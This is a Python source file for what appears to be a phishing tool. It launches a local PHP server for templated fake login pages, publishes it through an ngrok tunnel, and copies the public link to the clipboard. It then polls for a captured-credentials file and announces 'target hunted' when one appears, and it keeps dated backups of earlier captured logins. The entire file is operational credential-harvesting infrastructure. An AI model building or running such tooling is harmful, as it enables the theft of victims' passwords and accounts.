import os
import time
from pyngrok import ngrok, exception
from subprocess import Popen
import pyperclip
from datetime import datetime


class application:
    url = None
    loginPath = "./src/logs/login.txt"
    phpLogsPath = "./src/logs/serv.txt"

    def __init__(self, template):
        try:
            self.removeLogin()

            self.startPhpHost()

            self.startNgrokHost(template)

            # end-point
            self.disconnectNgrok()

        except KeyboardInterrupt:
            self.disconnectNgrok()
            self.killPhpServer()
        except exception.PyngrokSecurityError:
            print("[!] Error : Pyngrok => security error\n")
            self.disconnectNgrok()
        except exception.PyngrokError:
            print("[!] Error : Pyngrok => error\n")
        except exception.PyngrokNgrokError:
            print("[!] Error : Pyngrok => error\n")
        except exception.PyngrokNgrokURLError:
            print("[!] Error : Pyngrok => URL Error\n")
            self.disconnectNgrok()
        except exception.PyngrokNgrokHTTPError:
            print("[!] Error : Pyngrok => Http Error\n")
            self.disconnectNgrok()
        except exception.PyngrokNgrokInstallError:
            print("[!] Error : Pyngrok => Faild to install pyngrok\n")

    def startNgrokHost(self, templatePath):
        self.url = ngrok.connect(8000, "http")

        pageURL = self.url.public_url
        os.system("cls")

        print("[+] ngrok runing on {}/pages{}".format(pageURL, templatePath["path"]))

        # add to clipboard link
        pyperclip.copy("{}/pages{}".format(pageURL, templatePath["path"]))

        print("[+] link clipboard !")

        time.sleep(2.5)

        self.checkISfileExist()

    def removeLogin(self):
        # check if login.txt excest in logs
        if os.path.isfile(self.loginPath):
            removeAccess = input(
                "do you wana remove last login (yes or no)").lower()
            if removeAccess == "yes":
                print("[#] ok im add backupfile from last login and remove it !")
                self.addBackupLogin()
                print("[+] Backup created successfully\n")
                os.remove(self.loginPath)
                print("[-] remove login file successfully\n")
            elif removeAccess == "no":
                print("[#] ok but app close while you have login.txt")
                return False
            else:
                return False
        else:
            return False

    def addBackupLogin(self):
        lastLogin = open(self.loginPath, "r").readlines()
        today = datetime.now().strftime("%Y-%m-%d %H.%M.%S")

        with open("./src/logs/{}.txt".format(today), "w") as file:
            for item in lastLogin:
                file.write("%s\n" % item)

    def startPhpHost(self):
        print("[+] start php localhost")
        with open(self.phpLogsPath, "w") as serLog:
            Popen(("php", "-S", "localhost:8000", "-t", "./src"),
                  stderr=serLog, stdout=serLog)

    def killPhpServer(self):
        print("[!] php server turm off")
        os.system("taskkill /F /IM php*")

    def disconnectNgrok(self):
        print("[!] ngrok is turn off")
        ngrok.disconnect(self.url)

    def checkISfileExist(self):
        while True:
            if os.path.isfile(self.loginPath):
                print("[+] target hunted ./src/logs/login.txt")
                break
            else:
                print("waiting for target ", end="\r")
                time.sleep(0.35)
                print("waiting for target .", end="\r")
                time.sleep(0.35)
                print("waiting for target ..", end="\r")
                time.sleep(0.35)
                print("waiting for target ...", end="\r")
                time.sleep(0.35)
                os.system("cls")
                continue
        return True
